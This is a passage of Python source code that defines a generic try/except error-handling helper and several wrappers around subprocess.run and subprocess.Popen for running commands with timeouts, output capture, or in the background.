        update_status(f"{tool_name} error: {e}", "Error")
        return None





# Utility function for common error handling patterns
def safe_execute(operation_name, operation_func, error_phase="Error", return_on_error=None):
    """Generic error handler to reduce repetitive try/except blocks"""
    try:
        return operation_func()
    except Exception as e:
        update_status(f"{operation_name} failed: {e}", error_phase)
        return return_on_error

# Subprocess utility functions to reduce code duplication
def run_cmd_simple(cmd, description="Command", timeout=30, check=True, capture_output=True):
    """Simple subprocess.run wrapper with consistent error handling"""
    return safe_execute(
        description,
        lambda: subprocess.run(cmd, check=check, capture_output=capture_output, timeout=timeout),
        "Error"
    )

def run_cmd_with_output(cmd, description="Command", timeout=30, check=True):
    """Subprocess.run wrapper that returns output as text"""
    return safe_execute(
        description,
        lambda: subprocess.run(cmd, capture_output=True, text=True, check=check, timeout=timeout),
        "Error"
    )

def run_cmd_background(cmd, description="Background command"):
    """Subprocess.Popen wrapper for background processes"""
    return safe_execute(
        description,
        lambda: subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        "Error"
    )

def run_cmd_with_pipes(cmd, description="Command with pipes"):
    """Subprocess.Popen wrapper with pipes for output capture"""
    return safe_execute(
        description,
        lambda: subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE),
        "Error"
    )
